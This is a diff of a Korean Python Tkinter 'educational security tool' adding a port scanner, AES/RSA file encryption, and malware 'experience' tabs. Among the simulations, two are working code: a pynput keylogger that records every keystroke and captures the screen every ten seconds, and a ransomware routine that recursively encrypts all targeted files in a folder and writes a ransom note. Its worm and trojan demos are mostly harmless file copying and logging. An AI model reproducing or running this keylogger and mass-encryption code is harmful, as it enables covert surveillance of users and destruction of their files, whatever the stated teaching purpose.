+    def create_threat_tab(self):
+        threat_frame = ttk.Frame(self.notebook, padding="15")
+        self.notebook.add(threat_frame, text="🦠 위협 요소 체험")
+        
+        threat_frame.columnconfigure(1, weight=1) 
+        
+        # --- 시뮬레이션 경로 설정 UI 추가 ---
+        ttk.Label(threat_frame, text="**시뮬레이션 로그/파일 저장 경로:**", font=('Malgun Gothic', 10, 'bold')).grid(row=0, column=0, columnspan=3, pady=(5, 5), sticky='w')
+        
+        # 시뮬레이션 경로 입력창 (기본값은 키 저장 경로 내 ThreatSim)
+        default_threat_dir = self.key_base_dir / "ThreatSim" 
+        self.threat_log_dir_path = ttk.Entry(threat_frame, width=35)
+        self.threat_log_dir_path.grid(row=1, column=0, pady=7, padx=(0, 5), sticky='ew', columnspan=2)
+        self.threat_log_dir_path.insert(0, str(default_threat_dir))
+        
+        ttk.Button(threat_frame, text="📁 폴더 선택", command=lambda: self.browse_directory(self.threat_log_dir_path)).grid(row=1, column=2, padx=5)
+        
+        ttk.Separator(threat_frame, orient='horizontal').grid(row=2, column=0, columnspan=3, sticky='ew', pady=10)
+        
+        # 1. 웜 바이러스 체험 
+        ttk.Label(threat_frame, text="1. 웜 바이러스 (자기 복제)", font=('Malgun Gothic', 10, 'bold')).grid(row=3, column=0, columnspan=3, pady=(5, 5), sticky='w')
+        ttk.Label(threat_frame, text="선택 폴더 내에 시뮬레이션 파일(.log)을 복제합니다.").grid(row=4, column=0, columnspan=3, sticky='w')
+        
+        ttk.Label(threat_frame, text="복제 대상 폴더:").grid(row=5, column=0, pady=7, padx=(0, 10), sticky='w')
+        self.worm_dir_path = ttk.Entry(threat_frame, width=35); self.worm_dir_path.grid(row=5, column=1, pady=7, padx=5, sticky='ew')
+        ttk.Button(threat_frame, text="📁 폴더 선택", command=lambda: self.browse_directory(self.worm_dir_path)).grid(row=5, column=2, padx=5)
+
+        ttk.Button(threat_frame, text="💥 웜 복제 시뮬레이션 시작", style='Encrypt.TButton', command=self.execute_worm_thread).grid(row=6, column=0, pady=(5, 15), columnspan=3, sticky='ew', padx=5)
+        
+        ttk.Separator(threat_frame, orient='horizontal').grid(row=7, column=0, columnspan=3, sticky='ew', pady=10)
+
+        # 2. 스파이웨어/키로거 체험 
+        ttk.Label(threat_frame, text="2. 스파이웨어/키로거 (실제 키 로깅 & 캡처)", font=('Malgun Gothic', 10, 'bold')).grid(row=8, column=0, columnspan=3, pady=(5, 5), sticky='w')
+        
+        ttk.Label(threat_frame, text="캡처/로그 저장 폴더:").grid(row=9, column=0, pady=7, padx=(0, 10), sticky='w')
+        self.spy_log_dir_path = ttk.Entry(threat_frame, width=35); self.spy_log_dir_path.grid(row=9, column=1, pady=7, padx=5, sticky='ew')
+        self.spy_log_dir_path.insert(0, str(default_threat_dir)) # 기본값 설정
+        ttk.Button(threat_frame, text="📁 폴더 선택", command=lambda: self.browse_directory(self.spy_log_dir_path)).grid(row=9, column=2, padx=5)
+
+        ttk.Label(threat_frame, text=f"**실시간 키 입력이 '{SPY_LOG_NAME}'에 기록되고, 바탕화면이 캡처됩니다.**", foreground='#D32F2F').grid(row=10, column=0, columnspan=3, sticky='w')
+        
+        self.spyware_button = ttk.Button(threat_frame, text="🕵️ 스파이웨어/키로거 시뮬레이션 시작", style='Scan.TButton', command=self.toggle_spyware_thread)
+        self.spyware_button.grid(row=11, column=0, pady=(5, 15), columnspan=3, sticky='ew', padx=5)
+        
+        ttk.Separator(threat_frame, orient='horizontal').grid(row=12, column=0, columnspan=3, sticky='ew', pady=10)
+
+        # 3. 트로이 목마 체험 
+        ttk.Label(threat_frame, text="3. 트로이 목마 (은닉 실행)", font=('Malgun Gothic', 10, 'bold')).grid(row=13, column=0, columnspan=3, pady=(5, 5), sticky='w')
+        ttk.Label(threat_frame, text="정상 프로그램처럼 보이지만, 백그라운드에서 지정 경로에 로그를 생성합니다.").grid(row=14, column=0, columnspan=3, sticky='w')
+
+        ttk.Button(threat_frame, text="🐴 트로이 목마 시뮬레이션 실행", style='Decrypt.TButton', command=self.execute_trojan_thread).grid(row=15, column=0, pady=(5, 5), columnspan=3, sticky='ew', padx=5)
+        
+        # --- 상태 표시 위젯 ---
+        self.threat_status_var = tk.StringVar(value="📢 대기 중...")
+        ttk.Label(threat_frame, textvariable=self.threat_status_var, font=('Malgun Gothic', 10, 'italic')).grid(row=16, column=0, columnspan=3, pady=(15, 5), sticky='w')
+
+
+    # --- 6. 개발자 정보 탭 ---
+    def create_developer_tab(self):
+        dev_frame = ttk.Frame(self.notebook, padding="15")
+        self.notebook.add(dev_frame, text="👨‍💻 개발자 정보")
+        
+        info = [
+            ("프로그램 이름:", "파이썬 통합 보안 도구 (교육용)"),
+            ("버전:", "3.0 (2025년 11월)"),
+            ("사용 언어:", "Python 3 + Tkinter"),
+            ("핵심 라이브러리:", "cryptography, socket, threading, Pillow, pynput"),
+            ("제작 목적:", "암호화, 스캐닝 및 악성코드 동작 학습"),
+            ("주의 사항:", f"1:RSA 키는 지정된 경로에 저장됩니다.\n2:절대로 이 프로그램을 악용하여 입힌 피해는 제 책임이 아닌 자기 자신의 책임을 알아주십시오") 
+]
+
+        for i, (label, value, *color) in enumerate(info):
+            ttk.Label(dev_frame, text=label, font=('Malgun Gothic', 10, 'bold')).grid(row=i, column=0, sticky='w', pady=5, padx=(0, 10))
+            val_label = ttk.Label(dev_frame, text=value, font=('Malgun Gothic', 10))
+            if color:
+                val_label.configure(foreground=color[0])
+            val_label.grid(row=i, column=1, sticky='w', pady=5)
+
+
+    # ----------------------------------------------------------------------
+    # C. 기능 실행 메서드 (포트 스캐너, AES, RSA, 랜섬웨어) 
+    # ----------------------------------------------------------------------
+    
+    # --- 포트 스캐너  ---
+    def execute_scan_thread(self):
+        """포트 스캔을 새 스레드에서 시작"""
+        ip = self.target_ip_entry.get()
+        try:
+            start_port = int(self.start_port_entry.get())
+            end_port = int(self.end_port_entry.get())
+            if not ip or not (0 < start_port <= 65535) or not (0 < end_port <= 65535) or start_port > end_port:
+                raise ValueError
+        except ValueError:
+            messagebox.showerror("오류", "유효한 IP 주소 및 포트 범위를 입력하세요 (1-65535).")
+            return
+
+        self.result_text.config(state='normal')
+        self.result_text.delete(1.0, tk.END)
+        self.result_text.config(state='disabled')
+        
+        self.scan_progress_var.set(0)
+        self.scan_status_var.set("📢 스캔 시작...")
+        
+        threading.Thread(target=self._run_port_scan, args=(ip, start_port, end_port)).start()
+
+    def _run_port_scan(self, ip, start_port, end_port):
+        """실제 포트 스캔 로직"""
+        open_ports = []
+        total_ports = end_port - start_port + 1
+        
+        def scan_port(port):
+            """단일 포트 스캔 시도"""
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1.0)
+                result = s.connect_ex((ip, port))
+                s.close()
+                if result == 0:
+                    open_ports.append(port)
+                    self.master.after(0, self._update_scan_result, f"✅ 포트 열림: {port}\n")
+            except Exception:
+                pass
+
+        threads = []
+        for port in range(start_port, end_port + 1):
+            t = threading.Thread(target=scan_port, args=(port,))
+            threads.append(t)
+            t.start()
+            
+            # 진행률 업데이트 로직 
+            progress = int(((port - start_port + 1) / total_ports) * 100)
+            self.master.after(0, self.scan_progress_var.set, progress)
+            self.master.after(0, self.scan_status_var.set, f"🔍 {ip} 스캔 중... ({port}/{end_port})")
+
+        for t in threads:
+            t.join()
+
+        final_message = f"스캔 완료. 열린 포트: {len(open_ports)}개"
+        self.master.after(0, self.scan_status_var.set, final_message)
+        self.master.after(0, self.scan_progress_var.set, 100)
+        
+        if not open_ports:
+            self.master.after(0, self._update_scan_result, "❌ 열린 포트가 발견되지 않았습니다.\n")
+        
+        self.master.after(0, self._update_scan_result, f"\n--- {final_message} ---\n")
+        self.master.after(0, self.scan_progress_var.set, 0)
+        self.master.after(0, self.scan_status_var.set, "📢 대기 중...")
+        
+    def _update_scan_result(self, text):
+        """텍스트 위젯에 스캔 결과를 안전하게 추가"""
+        self.result_text.config(state='normal')
+        self.result_text.insert(tk.END, text)
+        self.result_text.see(tk.END)
+        self.result_text.config(state='disabled')
+
+    # --- AES 암호화/복호화 ---
+    def execute_aes_encrypt_thread(self):
+        filepath = self.aes_file_path.get()
+        if not os.path.exists(filepath): messagebox.showerror("오류", "파일 경로가 유효하지 않습니다."); return
+        self.aes_progress_var.set(0)
+        self.aes_status_var.set("📢 암호화 시작...")
+        threading.Thread(target=self._run_aes_encrypt, args=(filepath, self.aes_key_base_dir)).start()
+
+    def _run_aes_encrypt(self, filepath, key_base_dir):
+        try:
+            aes_encrypt_file_chunked(
+                filepath, 
+                key_base_dir,
+                lambda p, m: self.update_progress(self.aes_progress_var, self.aes_status_var, p, m)
+            )
+            self.master.after(0, messagebox.showinfo, "성공", f"파일 암호화 완료: {pathlib.Path(filepath).name + AES_EXT}")
+        except Exception as e:
+            self.master.after(0, messagebox.showerror, "오류", f"AES 암호화 실패: {e}")
+        finally:
+            self.master.after(0, self.aes_progress_var.set, 0)
+            self.master.after(0, self.aes_status_var.set, "📢 대기 중...")
+    
+    def execute_aes_decrypt_thread(self):
+        encrypted_filepath = self.aes_file_path.get()
+        if not os.path.exists(encrypted_filepath) or not encrypted_filepath.endswith(AES_EXT): 
+            messagebox.showerror("오류", f"유효한 암호화 파일 경로가 아닙니다. ({AES_EXT} 확장자 확인)")
+            return
+        self.aes_progress_var.set(0)
+        self.aes_status_var.set("📢 복호화 시작...")
+        threading.Thread(target=self._run_aes_decrypt, args=(encrypted_filepath, self.aes_key_base_dir)).start()
+
+    def _run_aes_decrypt(self, encrypted_filepath, key_base_dir):
+        try:
+            aes_decrypt_file_chunked(
+                encrypted_filepath, 
+                key_base_dir,
+                lambda p, m: self.update_progress(self.aes_progress_var, self.aes_status_var, p, m)
+            )
+            self.master.after(0, messagebox.showinfo, "성공", f"파일 복호화 완료: {pathlib.Path(encrypted_filepath).name.replace(AES_EXT, '')}")
+        except Exception as e:
+            self.master.after(0, messagebox.showerror, "오류", f"AES 복호화 실패: {e}")
+        finally:
+            self.master.after(0, self.aes_progress_var.set, 0)
+            self.master.after(0, self.aes_status_var.set, "📢 대기 중...")
+
+
+    # --- RSA 키 관리 및 암호화/복호화 ---
+    def execute_rsa_key_pair_thread(self):
+        """RSA 키 쌍 생성 스레드 시작"""
+        self.rsa_progress_var.set(0)
+        self.rsa_status_var.set("📢 RSA 키 쌍 생성 시작...")
+        threading.Thread(target=self._run_rsa_key_pair).start()
+
+    def _run_rsa_key_pair(self):
+        """실제 RSA 키 쌍 생성 로직"""
+        try:
+            private_key = rsa.generate_private_key(
+                public_exponent=65537,
+                key_size=4096,
+                backend=default_backend()
+            )
+            public_key = private_key.public_key()
+
+            # 개인키 저장
+            private_pem = private_key.private_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PrivateFormat.PKCS8,
+                encryption_algorithm=serialization.NoEncryption()
+            )
+            with open(self.key_base_dir / "private.pem", "wb") as f:
+                f.write(private_pem)
+
+            # 공개키 저장
+            public_pem = public_key.public_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PublicFormat.SubjectPublicKeyInfo
+            )
+            with open(self.key_base_dir / "public.pem", "wb") as f:
+                f.write(public_pem)
+                
+            self.master.after(0, self.rsa_progress_var.set, 100)
+            self.master.after(0, messagebox.showinfo, "성공", f"RSA 4096bit 키 쌍이 '{self.key_base_dir}'에 생성되었습니다.")
+        except Exception as e:
+            self.master.after(0, messagebox.showerror, "오류", f"RSA 키 생성 실패: {e}")
+        finally:
+            self.master.after(0, self.rsa_progress_var.set, 0)
+            self.master.after(0, self.rsa_status_var.set, "📢 대기 중...")
+    
+    def execute_rsa_encrypt_thread(self):
+        filepath = self.rsa_file_path.get()
+        if not os.path.exists(filepath): messagebox.showerror("오류", "파일 경로가 유효하지 않습니다."); return
+        self.rsa_progress_var.set(0)
+        self.rsa_status_var.set("📢 암호화 시작...")
+        threading.Thread(target=self._run_rsa_encrypt, args=(filepath,)).start()
+
+    def _run_rsa_encrypt(self, filepath):
+        try:
+            public_key = load_public_key(self.key_base_dir)
+            hybrid_encrypt_file_chunked(
+                filepath, 
+                public_key,
+                lambda p, m: self.update_progress(self.rsa_progress_var, self.rsa_status_var, p, m)
+            )
+            self.master.after(0, messagebox.showinfo, "성공", f"RSA 하이브리드 암호화 완료: {pathlib.Path(filepath).name + HYB_EXT}")
+        except Exception as e:
+            self.master.after(0, messagebox.showerror, "오류", f"RSA 암호화 실패: {e}")
+        finally:
+            self.master.after(0, self.rsa_progress_var.set, 0)
+            self.master.after(0, self.rsa_status_var.set, "📢 대기 중...")
+
+    def execute_rsa_decrypt_thread(self):
+        encrypted_filepath = self.rsa_file_path.get()
+        if not os.path.exists(encrypted_filepath) or not encrypted_filepath.endswith(HYB_EXT): 
+            messagebox.showerror("오류", f"유효한 암호화 파일 경로가 아닙니다. ({HYB_EXT} 확장자 확인)")
+            return
+        self.rsa_progress_var.set(0)
+        self.rsa_status_var.set("📢 복호화 시작...")
+        threading.Thread(target=self._run_rsa_decrypt, args=(encrypted_filepath,)).start()
+
+    def _run_rsa_decrypt(self, encrypted_filepath):
+        try:
+            private_key = load_private_key(self.key_base_dir)
+            hybrid_decrypt_file_chunked(
+                encrypted_filepath, 
+                private_key,
+                lambda p, m: self.update_progress(self.rsa_progress_var, self.rsa_status_var, p, m)
+            )
+            self.master.after(0, messagebox.showinfo, "성공", f"RSA 하이브리드 복호화 완료: {pathlib.Path(encrypted_filepath).name.replace(HYB_EXT, '')}")
+        except Exception as e:
+            self.master.after(0, messagebox.showerror, "오류", f"RSA 복호화 실패: {e}")
+        finally:
+            self.master.after(0, self.rsa_progress_var.set, 0)
+            self.master.after(0, self.rsa_status_var.set, "📢 대기 중...")
+
+
+    # --- 랜섬웨어 체험 ---
+    def execute_ransom_encrypt_thread(self):
+        target_dir = self.ransom_dir_path.get()
+        if not os.path.isdir(target_dir): 
+            messagebox.showerror("오류", "유효한 대상 폴더 경로가 아닙니다."); return
+        self.ransom_progress_var.set(0)
+        self.ransom_status_var.set("📢 랜섬웨어 암호화 시작...")
+        threading.Thread(target=self._run_ransom_encrypt, args=(target_dir,)).start()
+
+    def _run_ransom_encrypt(self, target_dir):
+        try:
+            public_key = load_public_key(self.key_base_dir)
+            
+            files = [p for p in pathlib.Path(target_dir).rglob('*') if p.suffix.lower() in RANSOM_EXTS and p.is_file()]
+            if not files:
+                self.master.after(0, messagebox.showwarning, "경고", "암호화할 대상 파일이 없습니다.")
+                return
+
+            total_files = len(files)
+            for i, filepath in enumerate(files):
+                self.update_progress(self.ransom_progress_var, self.ransom_status_var, 
+                                     int(((i + 1) / total_files) * 100), 
+                                     f"🔥 ({i+1}/{total_files}) 암호화 중: {filepath.name}")
+                
+                # 파일별 개별 진행률 콜백  
+                def progress_cb(p, m): pass 
+                
+                hybrid_encrypt_file_chunked(str(filepath), public_key, progress_cb)
+            
+            # 랜섬 노트 생성
+            ransom_note_path = pathlib.Path(target_dir) / RANSOM_NOTE_NAME
+            with open(ransom_note_path, 'w', encoding='utf-8') as f:
+                f.write(RANSOM_NOTE_CONTENT)
+
+            self.master.after(0, messagebox.showinfo, "성공", f"랜섬웨어 시뮬레이션 완료. {total_files}개 파일 암호화 및 랜섬 노트 생성 완료.")
+        except Exception as e:
+            self.master.after(0, messagebox.showerror, "오류", f"랜섬웨어 암호화 실패: {e}")
+        finally:
+            self.master.after(0, self.ransom_progress_var.set, 0)
+            self.master.after(0, self.ransom_status_var.set, "📢 대기 중...")
+            
+    def execute_ransom_decrypt_thread(self):
+        target_dir = self.ransom_dir_path.get()
+        if not os.path.isdir(target_dir): 
+            messagebox.showerror("오류", "유효한 대상 폴더 경로가 아닙니다."); return
+        self.ransom_progress_var.set(0)
+        self.ransom_status_var.set("📢 랜섬웨어 복호화 시작...")
+        threading.Thread(target=self._run_ransom_decrypt, args=(target_dir,)).start()
+
+    def _run_ransom_decrypt(self, target_dir):
+        try:
+            private_key = load_private_key(self.key_base_dir)
+            
+            files = [p for p in pathlib.Path(target_dir).rglob('*') if p.suffix.lower() == HYB_EXT and p.is_file()]
+            if not files:
+                self.master.after(0, messagebox.showwarning, "경고", "복호화할 암호화된 파일이 없습니다.")
+                return
+
+            total_files = len(files)
+            for i, filepath in enumerate(files):
+                self.update_progress(self.ransom_progress_var, self.ransom_status_var, 
+                                     int(((i + 1) / total_files) * 100), 
+                                     f"🔑 ({i+1}/{total_files}) 복호화 중: {filepath.name}")
+                
+                def progress_cb(p, m): pass
+                
+                hybrid_decrypt_file_chunked(str(filepath), private_key, progress_cb)
+                
+            # 랜섬 노트 삭제
+            ransom_note_path = pathlib.Path(target_dir) / RANSOM_NOTE_NAME
+            if ransom_note_path.exists():
+                os.remove(ransom_note_path)
+
+            self.master.after(0, messagebox.showinfo, "성공", f"랜섬웨어 복구 시뮬레이션 완료. {total_files}개 파일 복호화 및 랜섬 노트 삭제 완료.")
+        except Exception as e:
+            self.master.after(0, messagebox.showerror, "오류", f"랜섬웨어 복호화 실패: {e}")
+        finally:
+            self.master.after(0, self.ransom_progress_var.set, 0)
+            self.master.after(0, self.ransom_status_var.set, "📢 대기 중...")
+            
+    
+    # ----------------------------------------------------------------------
+    # D. 위협 요소 체험 메서드 
+    # ----------------------------------------------------------------------
+
+    # 1. 웜 바이러스 체험
+    def execute_worm_thread(self):
+        target_dir = self.worm_dir_path.get()
+        if not os.path.isdir(target_dir): 
+            messagebox.showerror("오류", "유효한 복제 대상 폴더 경로가 아닙니다."); return
+        self.threat_status_var.set("📢 웜 복제 시작...")
+        threading.Thread(target=self._worm_simulation, args=(target_dir,)).start()
+        
+    def _worm_simulation(self, target_dir):
+        try:
+            target_path = pathlib.Path(target_dir) / WORM_FILE_NAME
+            
+            # 최초 파일 생성
+            if not target_path.exists():
+                with open(target_path, 'w', encoding='utf-8') as f:
+                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] 웜 시뮬레이션 파일 생성\n")
+            
+            # 자기 복제 (10회 시뮬레이션)
+            for i in range(1, 11):
+                clone_name = f"clone_{i}_{WORM_FILE_NAME}"
+                clone_path = pathlib.Path(target_dir) / clone_name
+                shutil.copy(target_path, clone_path)
+                with open(target_path, 'a', encoding='utf-8') as f:
+                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] 복제 파일 생성: {clone_name}\n")
+                self.master.after(0, self.threat_status_var.set, f"💥 웜 복제 중... ({i}/10) {clone_name} 생성")
+                time.sleep(0.5) 
+                
+            self.master.after(0, messagebox.showinfo, "성공", f"웜 시뮬레이션 완료. 총 10개 파일이 '{target_dir}'에 복제되었습니다.")
+        except Exception as e:
+            self.master.after(0, messagebox.showerror, "오류", f"웜 시뮬레이션 실패: {e}")
+        finally:
+            self.master.after(0, self.threat_status_var.set, "📢 대기 중...")
+
+
+    # 2. 스파이웨어/키로거 체험
+    def toggle_spyware_thread(self):
+        if self.is_key_logging:
+            # 중지
+            self._stop_key_logging()
+            self.spyware_button.config(text="🕵️ 스파이웨어/키로거 시뮬레이션 시작", style='Scan.TButton')
+            self.threat_status_var.set("📢 키로거/스파이웨어 중지됨")
         else:
-            icon = "🔓"
-            # 🌟 수정된 부분: 복호화 성공 시 암호화 파일이 삭제됨을 명시
-            msg = f"{icon} 파일이 성공적으로 {operation_type}되었으며, 암호화 파일이 삭제되었습니다.\n출력: {os.path.basename(output_file)}"
+            # 시작
+            target_dir = self.spy_log_dir_path.get()
+            try:
+                pathlib.Path(target_dir).mkdir(parents=True, exist_ok=True)
+            except Exception as e:
+                messagebox.showerror("오류", f"로그/캡처 저장 폴더 생성 실패: {e}"); return
             
-        messagebox.showinfo("성공", msg)
+            self.spyware_button.config(text="🛑 스파이웨어/키로거 중지", style='Decrypt.TButton')
+            self.threat_status_var.set("📢 키로거/스파이웨어 시작됨. 키 입력과 캡처를 기록 중...")
+            threading.Thread(target=self._start_key_logging, args=(target_dir,)).start()
+            threading.Thread(target=self._start_screen_capture, args=(target_dir,)).start()
+            self.is_key_logging = True
 
-
-# ==============================================================================
-# III. 메인 실행
-# ==============================================================================
-
-if __name__ == '__main__':
-    # 키 저장 디렉토리 생성 시도
-    try:
-        if not os.path.exists(FIXED_KEY_DIR):
-            os.makedirs(FIXED_KEY_DIR, exist_ok=True)
-    except Exception as e:
-        # 키 저장 경로 문제 발생 시 경고
-        messagebox.showwarning("경로 오류", f"키 저장 경로 '{FIXED_KEY_DIR}' 생성에 실패했습니다. 권한을 확인하세요. : {e}")
+    def _start_key_logging(self, log_dir):
+        """키보드 리스너를 시작하고 로그 파일에 기록"""
+        log_path = pathlib.Path(log_dir) / SPY_LOG_NAME
         
+        def on_press(key):
+            try:
+                key_char = key.char
+            except AttributeError:
+                key_char = f'[{key.name}]'
+            
+            with open(log_path, 'a', encoding='utf-8') as f:
+                f.write(f"[{time.strftime('%H:%M:%S')}] {key_char}\n")
+                
+        def on_release(key):
+            if key == keyboard.Key.esc or not self.is_key_logging: # ESC를 누르거나 GUI에서 중지하면 종료
+                return False
+
+        try:
+            self.key_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+            self.key_listener.start()
+            self.key_listener.join()
+        except Exception as e:
+            if self.is_key_logging: # 사용자가 중지한 경우가 아니라면 에러 보고
+                self.master.after(0, messagebox.showerror, "키로거 오류", f"키 로깅 중 오류 발생: {e}")
+                self.master.after(0, self.toggle_spyware_thread) # 버튼 상태 리셋
+                
+    def _stop_key_logging(self):
+        """키보드 리스너를 안전하게 중지"""
+        self.is_key_logging = False
+        if self.key_listener:
+            # 키보드 리스너의 동작을 중지 (pynput 010 이상에서 지원)
+            self.key_listener.stop()
+            self.key_listener = None
+
+    def _start_screen_capture(self, log_dir):
+        """일정 시간 간격으로 화면 캡처 및 저장"""
+        while self.is_key_logging:
+            try:
+                capture_path = pathlib.Path(log_dir) / f"{CAPTURE_NAME}{time.strftime('%Y%m%d_%H%M%S')}.png"
+                img = ImageGrab.grab()
+                img.save(capture_path)
+                
+                log_path = pathlib.Path(log_dir) / SPY_LOG_NAME
+                with open(log_path, 'a', encoding='utf-8') as f:
+                    f.write(f"[{time.strftime('%H:%M:%S')}] 화면 캡처 완료: {capture_path.name}\n")
+                    
+                self.master.after(0, self.threat_status_var.set, f"🕵️ 캡처 및 키 로깅 중... 마지막 캡처: {capture_path.name}")
+                time.sleep(10) # 10초마다 캡처
+            except Exception as e:
+                # 캡처 실패 시 (예: 리소스 부족)
+                time.sleep(5)
+                continue
+                
+        self.master.after(0, self.threat_status_var.set, f"📢 키로거/스파이웨어 중지됨")
+
+
+    # 3. 트로이 목마 체험
+    def execute_trojan_thread(self):
+        target_dir = self.threat_log_dir_path.get()
+        try:
+            pathlib.Path(target_dir).mkdir(parents=True, exist_ok=True)
+        except Exception as e:
+            messagebox.showerror("오류", f"로그 저장 폴더 생성 실패: {e}"); return
+        
+        self.threat_status_var.set("📢 트로이 목마 실행됨 (백그라운드에서 로그 생성 시작)...")
+        # 실제로는 별도의 프로세스나 스레드로 백그라운드 작업을 실행
+        threading.Thread(target=self._trojan_simulation, args=(target_dir,)).start()
+        self.master.after(0, messagebox.showinfo, "트로이 목마 실행됨", "겉으로는 아무 일도 일어나지 않는 것처럼 보이지만, 백그라운드에서 악성 코드가 작동 중입니다. (확인 버튼을 누르면 정상 프로그램처럼 종료)")
+        self.threat_status_var.set("📢 대기 중...")
+
+
+    def _trojan_simulation(self, log_dir):
+        """백그라운드에서 은닉된 악성 동작 시뮬레이션"""
+        log_path = pathlib.Path(log_dir) / "trojan_activity_log.txt"
+        
+        try:
+            for i in range(1, 6): # 5회 활동 시뮬레이션
+                time.sleep(2) # 은닉된 지연
+                with open(log_path, 'a', encoding='utf-8') as f:
+                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] 은닉 활동 {i}: 중요 파일 검색 시도\n")
+                # 실제 트로이 목마는 여기서 시스템 정보 획득, 외부 통신 등을 시도합니다.
+        except Exception as e:
+            with open(log_path, 'a', encoding='utf-8') as f:
+                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] 오류 발생: {e}\n")
+
+
+# ==============================================================================
+# VI. 메인 실행 루프
+# ==============================================================================
+
+if __name__ == "__main__":
+    # Tkinter GUI는 메인 스레드에서 실행되어야 합니다.
     root = tk.Tk()
     app = SecurityToolGUI(root)
     root.mainloop()
